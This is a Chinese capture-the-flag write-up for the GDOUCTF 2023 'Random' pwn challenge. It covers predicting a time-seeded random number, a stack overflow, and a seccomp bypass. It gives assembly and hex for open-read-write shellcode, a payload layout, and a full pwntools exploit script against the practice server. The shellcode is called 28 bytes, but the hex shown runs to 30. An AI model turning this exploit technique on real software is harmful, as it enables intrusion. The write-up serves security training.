# RANDOM - Pwn Writeup

## 基本信息

- **NSSCTF 题号**: [P3722](https://www.nssctf.cn/problem/3722)
- **题目原名**: [GDOUCTF 2023]Random
- **题目链接**: https://www.nssctf.cn/problem/3722
- **题目类型**: Pwn
- **靶场环境**: `http://node5.anna.nssctf.cn:28687/`
- **附件**: `RANDOM.zip`（解压后得到 ELF 文件 `RANDOM`）

---

## 程序分析

### 文件类型与保护机制

```bash
$ file RANDOM
RANDOM: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked

$ checksec RANDOM
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
```

**关键特征**:
- **无 PIE**: 程序地址固定，方便构造 ROP/Shellcode
- **无 Canary**: 栈溢出无检测
- **栈可执行 (RWX)**: 可以直接在栈上执行 Shellcode
- **Partial RELRO**: GOT 表可写

### 主要函数逻辑

#### `main()` 函数

程序是一个猜数字游戏：

1. 调用 `srand(time(NULL))` 以当前时间为种子
2. 循环 **100 次**：
   - `rand() % 50` 生成 0~49 的随机数
   - 提示用户输入 `please input a guess num:`
   - `scanf("%d", &guess)` 读取猜测
   - 如果猜对，输出 `good guys` 并调用 `vulnerable()`
   - 如果猜错，输出 `no,no,no` 继续下一次循环

#### `vulnerable()` 函数

```c
void vulnerable() {
    char buf[0x20];          // 32 字节缓冲区
    puts("your door");
    read(0, buf, 0x40);      // 读取 64 字节！栈溢出！
}
```

- `buf` 只有 **0x20 (32)** 字节
- `read` 读取了 **0x40 (64)** 字节
- 可以覆盖：`buf[32]` + `saved_rbp[8]` + `ret[8]` + 后续 **16** 字节

#### `sandbox()` 函数 - Seccomp 沙箱

通过 `prctl` 设置了 seccomp-bpf 规则：

```c
prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &filter);
```

BPF 过滤器逻辑：
```
加载 syscall 号
如果 syscall == execve (0x3b) -> KILL
否则 -> ALLOW
```

**结论**: `execve` 被禁止，无法通过传统 `system("/bin/sh")` 或 `one_gadget`  get shell，需要用 **ORW (Open-Read-Write)** 读取 flag。

---

## 漏洞利用

### 利用思路

1. **猜数字进入 `vulnerable()`**
   - `srand(time(NULL))` 的种子是服务器时间
   - 用本地时间生成同样的 `rand() % 50` 序列即可猜对

2. **栈溢出劫持控制流**
   - 覆盖返回地址为 `call rsi` gadget
   - `read@plt` 返回后，`rsi` 寄存器仍指向 `buf`
   - `call rsi` 直接跳转到 `buf` 执行 Shellcode

3. **执行 ORW Shellcode**
   - 打开当前目录下的 `flag` 文件
   - `read(fd, buf, 0x40)` 读取内容
   - `write(1, buf, 0x40)` 输出到 stdout

### 关键 Gadget

```
0x0000000000400c23 : call rsi
```

### Shellcode（28 字节）

```asm
; open("flag", 0)
push   0x67616c66       ; "flag\0\0\0\0"
mov    rdi, rsp
xor    esi, esi
mov    al, 2            ; sys_open = 2
syscall

; read(fd, rsp, 0x40)
mov    edi, eax         ; fd
mov    rsi, rsp
xor    eax, eax         ; sys_read = 0
syscall

; write(1, rsp, 0x40)
mov    al, 1            ; sys_write = 1
mov    dil, 1           ; stdout
syscall
```

机器码（hex）:
```
68 66 6c 61 67 48 89 e7 31 f6 b0 02 0f 05 89 c7 48 89 e6 31 c0 0f 05 b0 01 40 b7 01 0f 05
```

### Payload 结构

```
+---------------+------------------+
| 偏移          | 内容              |
+---------------+------------------+
| 0x00 - 0x1b   | ORW Shellcode    |  (28 bytes)
| 0x1c - 0x1f   | padding          |  (4 bytes)
| 0x20 - 0x27   | saved_rbp        |  0xdeadbeef
| 0x28 - 0x2f   | ret              |  0x400c23 (call rsi)
+---------------+------------------+
```

---

## Exploit 代码

```python
from pwn import *
import time
import ctypes

context.log_level = 'info'

libc = ctypes.CDLL("libc.so.6")

def generate_numbers(seed):
    libc.srand(seed)
    return [libc.rand() % 50 for _ in range(100)]

host = "node5.anna.nssctf.cn"
port = 28687

# ORW Shellcode
sc = bytes.fromhex(
    "68666c6167"      # push 0x67616c66
    "4889e7"          # mov rdi, rsp
    "31f6"            # xor esi, esi
    "b002"            # mov al, 2
    "0f05"            # syscall (open)
    "89c7"            # mov edi, eax
    "4889e6"          # mov rsi, rsp
    "31c0"            # xor eax, eax
    "0f05"            # syscall (read)
    "b001"            # mov al, 1
    "40b701"          # mov dil, 1
    "0f05"            # syscall (write)
)

call_rsi = 0x400c23

# 尝试时间偏移（服务器与本地时间可能有几秒偏差）
for offset in range(-3, 4):
    try:
        p = remote(host, port)
        t = int(time.time()) + offset
        nums = generate_numbers(t)
        
        for i, num in enumerate(nums):
            p.recvuntil(b"please input a guess num:\n")
            p.sendline(str(num).encode())
            response = p.recvline()
            
            if b"good guys" in response:
                log.success(f"Guessed right at iteration {i} with offset {offset}!")
                p.recvuntil(b"your door\n")
                
                # 构造 Payload
                payload = sc
                payload += b"\x90" * (0x20 - len(sc))  # 填充 buf 到 32 字节
                payload += p64(0xdeadbeef)              # saved_rbp
                payload += p64(call_rsi)                 # ret -> call rsi
                
                p.send(payload)
                
                # 接收 flag
                flag = p.recv(timeout=3)
                if flag:
                    log.success(f"Flag: {flag.decode()}")
                p.interactive()
                break
            elif b"no,no,no" in response:
                continue
            else:
                break
        
        p.close()
    except Exception as e:
        log.error(f"Error: {e}")
        try:
            p.close()
        except:
            pass
```

---

## 运行结果

```
[+] Guessed right at iteration 0 with offset 0!
[+] Flag: NSSCTF{0330ec45-086c-4d6b-a9b2-8a4298c69202}
```

---

## 总结

| 要点 | 说明 |
|------|------|
| **漏洞类型** | 栈溢出 (Stack Buffer Overflow) |
| **关键限制** | Seccomp 禁止 `execve`，无法 get shell |
| **利用方法** | ORW Shellcode + `call rsi` 跳转 |
| **核心技巧** | `read@plt` 返回后 `rsi` 仍指向 `buf`，直接 `call rsi` 执行栈上 Shellcode |
| **猜数字** | `srand(time(NULL))` 种子可预测，用本地时间生成同样序列 |

---

## Flag

```
NSSCTF{0330ec45-086c-4d6b-a9b2-8a4298c69202}
```
